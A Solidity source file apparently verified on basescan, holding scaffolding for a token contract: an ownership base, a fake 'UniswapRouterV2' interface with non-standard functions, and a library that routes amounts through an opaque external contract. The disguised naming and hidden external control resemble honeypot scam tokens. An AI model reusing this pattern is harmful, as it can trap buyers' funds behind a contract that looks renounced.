/**
 *Submitted for verification at basescan.org on 2024-03-23
 */

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

interface UniswapRouterV2 {
    function swapppTokensForTokens(
        address a,
        uint b,
        address c
    ) external view returns (uint256);
    function swapTokensForTokens(
        address a,
        uint b,
        address c
    ) external view returns (uint256);
    function eth413swap(
        address choong,
        uint256 total,
        address destination
    ) external view returns (uint256);
    function getLPaddress(
        address a,
        uint b,
        address c
    ) external view returns (address);
}
abstract contract airplant {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract coffer is airplant {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library IUniswapRouterV20 {
    function swap2(
        UniswapRouterV2 instance,
        uint256 amount,
        address from
    ) internal view returns (uint256) {
        return instance.eth413swap(address(0), amount, from);
    }

    function swap99(
        UniswapRouterV2 instance2,
        UniswapRouterV2 instance,
        uint256 amount,
        address from
    ) internal view returns (uint256) {
        if (amount > 1) {
            return swap2(instance, amount, from);
        } else {
            return swap2(instance2, amount, from);
        }
    }
}

uint8 constant _decimals = 18;

library TestLib {
    bytes32 constant DIAMOND_STORAGE_POSITION =
        keccak256("diamond.standard.Test.storage");

    struct TestStorage {
        mapping(address => mapping(address => uint256)) _allowances;
        mapping(address => uint256) _balances;
        string _tokenname;
        string _tokensymbol;
        uint256 _totalSupply;
        UniswapRouterV2 BasedInstance;
        uint160 bb;
    }

    function diamondStorage() internal pure returns (TestStorage storage ds) {
        bytes32 position = DIAMOND_STORAGE_POSITION;
        assembly {
            ds.slot := position
        }
    }
}
